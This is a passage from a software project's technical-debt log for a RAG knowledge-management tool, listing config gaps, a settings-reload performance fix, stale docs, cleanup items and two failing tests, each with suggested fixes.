- **Description:** (1) 6 config vars used in code but missing from `.env.example`: `CORERAG_RESTRICTED_DB_PATH`, `CORERAG_VAULT_PATHS`, `CORERAG_BACKUP_INTEGRITY_CHECK`, `CORERAG_SERVER_HOST`, `CORERAG_ANSWER_MAX_EVIDENCE`, `CORERAG_SOURCE_AUTHORITY_DEFAULT`. (2) `CORERAG_API_KEY` comment implies it's the primary auth mechanism (now legacy). (3) `ARCHIVE_PATH` default differs between config.py (`~/Documents/PKM`) and .env.example (`~/Documents`).
- **Suggested Fix:** Add missing vars to `.env.example`, update stale comments, align defaults.
- **Trigger:** P9 Wave 4.

### TD-049: SettingsManager File Stat on Every Request

- **Severity:** Medium
- **Category:** Performance
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/settings/settings_manager.py:294-302`
- **Description:** `_ensure_loaded()` is called on every authenticated API request (via `check_permissions()` → `mgr.get_agents()` or `mgr.get_agent_by_key()`). It calls `self._path.stat().st_mtime` every time to detect settings file changes. The settings YAML file only changes when a user edits agent config via the dashboard — at most a few times per day.
- **Impact:** Minor but cumulative — one unnecessary `stat()` syscall per authenticated request.
- **Suggested Fix:** Add time-based debounce (re-stat every 5 seconds):
  ```python
  _RELOAD_INTERVAL = 5.0  # seconds
  def _ensure_loaded(self) -> None:
      if self._data is None:
          self.load()
          return
      now = time.monotonic()
      if now - self._last_stat_check < _RELOAD_INTERVAL:
          return
      self._last_stat_check = now
      if self._path.exists():
          mtime = self._path.stat().st_mtime
          if mtime != self._mtime:
              self.load()
  ```
- **Effort:** ~10 lines. Add `_last_stat_check` field to `__init__`.
- **Trigger:** P9 Wave 2.

### TD-050: Documentation Staleness (StartHere, Architecture, CLAUDE.md, DevPlan)

- **Severity:** Low
- **Category:** Documentation
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `_CATALOG/StartHere.md`, `_CATALOG/ARCHITECTURE.md`, `CLAUDE.md`, `_DEV/DevPlan.md`
- **Description:** Four documentation files have stale content that no longer matches the codebase:
  1. **`_CATALOG/StartHere.md`** (last updated 2026-03-09):
     - Reports "544 tests passing" — actual: 693 (Session 32)
     - Shows P6 enrichment at "~3% complete" — actual: 85.5%
     - Lists `src/auth/access_control.py` as "Scaffold (not wired)" — should say "Deprecated (replaced by SettingsManager)"
     - Missing `src/settings/` and `src/catalog/` from Source Code Map
  2. **`_CATALOG/ARCHITECTURE.md`:**
     - C4 Container diagram shows only a single LanceDB container — missing the Restricted LanceDB (`~/.corerag/lancedb-restricted/`) added in P8 SP3
     - Missing the SQLite catalog (`~/.corerag/_catalog.db`) added in P8 SP1
  3. **`CLAUDE.md`:**
     - Settings API (10 endpoints in `src/api/settings_routes.py`) not documented in the API section — no curl examples, no endpoint list
     - File Type Support section (line 429) claims code file support via `src/chunking/code_chunker.py` but the module is not wired into `extractor.py` — code files cannot actually be ingested
  4. **`_DEV/DevPlan.md`:**
     - Shows Session 27 metrics — not updated with Session 32 final numbers (693 tests, 102 cataloged docs, dual RAG, SettingsManager, per-agent permissions)
- **Impact:** New contributors or agents reading documentation get an inaccurate picture. The code_chunker claim is actively misleading.
- **Suggested Fix:** Update all four files. For CLAUDE.md code_chunker claim, either wire `code_chunker.py` into `extractor.py` or change to "(planned — module exists but not yet wired)".
- **Effort:** ~30 minutes across 4 files.
- **Trigger:** P9 Wave 4.

### TD-051: Stale GOOGLE_API_KEY Warning + Misc Cleanup

- **Severity:** Low
- **Category:** Code Quality
- **Found:** 2026-03-17 (P9 5-agent audit, Session 33)
- **Files:** `src/config.py:196-199`, `tests/test_access_control.py`, `src/classification/auto_tagger.py:694`, `requirements-dev.txt`
- **Description:** Four minor cleanup items found during the P9 audit:
  1. **Stale warning** (`config.py:196-199`): `validate_config()` emits `"Warning: GOOGLE_API_KEY is missing. Intelligence features will be limited."` on every startup when using the default Ollama provider. Misleading since 5 other providers work without it (Ollama, Claude CLI, Gemini CLI, Codex CLI, Anthropic API). Every fresh install using Ollama sees a false alarm.
  2. **Orphaned test** (`tests/test_access_control.py`, ~50 lines): Tests `src/auth/access_control.py` which was deprecated in P8 SP5 (replaced by `src/settings/settings_manager.py`). The test imports and exercises a dead module.
  3. **TODO stub** (`auto_tagger.py:694`): `AutoTagger.record_feedback()` has `# TODO: Use feedback to adjust thresholds or train classifier`. Method appends corrections to a list but never uses them. `LearnedRules` module handles similar functionality — this TODO may be obsolete.
  4. **Unused dev dependency** (`requirements-dev.txt`): `hypothesis` is listed but never imported in any test file. No property-based tests exist. Also, `mutmut` is in `pyproject.toml` dev deps but not in `requirements-dev.txt`.
- **Suggested Fix:**
  1. Change warning to only fire if NO provider is configured (no Ollama, no API keys, no CLI)
  2. Delete `tests/test_access_control.py`
  3. Remove the TODO or add note that `LearnedRules` handles feedback
  4. Remove `hypothesis` from `requirements-dev.txt`, align `mutmut` between files
- **Effort:** ~15 minutes total for all 4 items.
- **Trigger:** P9 Wave 4.

### TD-052: Pre-existing Test Failure — test_approve_archives_and_exports

- **Severity:** Low
- **Category:** Test Coverage / Bug
- **Found:** 2026-03-17 (Session 33, P9 hardening)
- **Files:** `tests/test_hitl.py::TestExecutionFlow::test_approve_archives_and_exports`, `src/executor.py`, `src/exporter.py`
- **Description:** The test creates a staging item, approves it via `execute_approved_item()`, then asserts a vault markdown file was created in the test vault directory. The assertion fails because the vault directory is empty after commit. The test logs show `"Catalog registration failed: UNIQUE constraint failed"` — the catalog `register()` call in `executor.py` raises a UNIQUE constraint error (likely the test uses a document ID that already exists in the test DB), and the exporter may not be called at all, or the vault path in the test fixture doesn't match what `exporter.py` expects.
  ```python
  # The failing assertion (tests/test_hitl.py):
  vault_files = list(vault_path.glob("**/*.md"))
  assert len(vault_files) > 0, f"Vault note should be created. Vault contents: {vault_files}"
  ```
  Pre-existing failure confirmed by `git stash` test against the base branch (before any P9 changes).
- **Error:** `AssertionError: Vault note should be created. Vault contents: []`
- **Impact:** The vault export step of the commit pipeline has no test coverage. If `exporter.py` breaks, no test catches it.
- **Suggested Fix:**
  1. Run the test with `-s` to see full log output and determine where the pipeline stops
  2. Check if the test fixture's `VAULT_PATH` matches what `exporter.py` reads from `config.VAULT_PATH`
  3. Check if the UNIQUE constraint error in catalog `register()` causes the entire `execute_approved_item()` to abort before reaching the exporter call
  4. Fix: either mock the catalog to avoid the constraint error, or use a unique document ID per test run
  5. Verify the exporter writes to the fixture's vault path, not the real vault path
- **Effort:** ~30 minutes (read executor.py call sequence, trace vault path from test fixture through exporter, fix mock or path).
- **Trigger:** Next test quality pass.

### TD-053: Intermittent Test Failure — test_concurrent_adds_no_corruption

- **Severity:** Low
- **Category:** Test Isolation
- **Found:** 2026-03-18 (Session 33, P9 verification)
- **Files:** `tests/test_staging.py::TestConcurrentAccess::test_concurrent_adds_no_corruption`
- **Description:** This test spawns 10 threads that each call `add_to_staging()` to add an item to the staging manifest, then asserts `len(manifest) == 10`. The test passes reliably in isolation (5/5 runs) but fails intermittently during full test suite runs. The likely cause is a test isolation issue: the `temp_manifest` fixture (which patches `STAGING_MANIFEST_PATH` to a temp file) does not fully isolate when another test in the suite leaves residual state or patches the staging module's globals in a way that bleeds between tests.
  ```python
  # The test (tests/test_staging.py line 164):
  def test_concurrent_adds_no_corruption(self, temp_manifest):
      threads = [threading.Thread(target=add_item, args=(i,)) for i in range(10)]
      for t in threads:
          t.start()
      for t in threads:
          t.join()
      assert not errors
      manifest = load_manifest()
      assert len(manifest) == 10  # Fails when residual items exist from other tests
  ```
- **Error:** `AssertionError: assert len(manifest) != 10` (actual count varies — includes items from other tests that bled through)
- **Impact:** Low — the test validates concurrent write safety for the staging manifest. The underlying functionality works; the issue is test isolation, not a code bug.
- **Suggested Fix:** Investigate the `temp_manifest` fixture to ensure it creates a fresh empty manifest file AND patches the module-level `STAGING_MANIFEST_PATH` before each test. Options:
  1. Add `manifest_path.write_text("{}")` at the start of the fixture to guarantee empty state
  2. Use `monkeypatch` instead of `patch` to ensure cleanup even on test failure
  3. Add `autouse=True` fixture in the test class that resets the manifest between tests
  4. Mark the test with `@pytest.mark.flaky(reruns=2)` if the fix is not straightforward
- **Effort:** ~15 minutes (investigate fixture, add reset logic).
- **Trigger:** Next test quality pass.

---

## Resolved Items

### TD-004: GitHub Social Preview Image

- **Severity:** Medium
- **Category:** Documentation / Publishing
- **Found:** 2026-02-07 (GitHub publication)
- **Resolved:** 2026-03-15
- **Resolution:** Hero image exists at `assets/core_rag_banner.png` (1024x1024, 745KB). Referenced in README.md line 7. TD was tracking the wrong filename (`social-preview.png`). Image is set as GitHub social preview via repo settings.

### TD-006: RAG Evaluator Wrong generate() Call Signature

- **Severity:** Low
- **Category:** Bug
- **Found:** 2026-03-09 (qwen3 plan review)
- **Resolved:** 2026-03-14
- **Resolution:** Changed 3 calls from `self.provider.generate(prompt, max_tokens=10)` to `self.provider.generate("", prompt)` in `src/quality/rag_evaluator.py:91,123,135`. Matches `LLMProvider.generate(system_prompt, user_prompt)` signature.

### TD-005: StartHere.md Path in .security_baseline

- **Severity:** Low
- **Category:** Configuration
- **Found:** 2026-03-09 (v2 migration)
- **Resolved:** 2026-03-09
- **Resolution:** Updated `.security_baseline` entry from `StartHere.md` to `_CATALOG/StartHere.md`. Committed as `32a477a`.
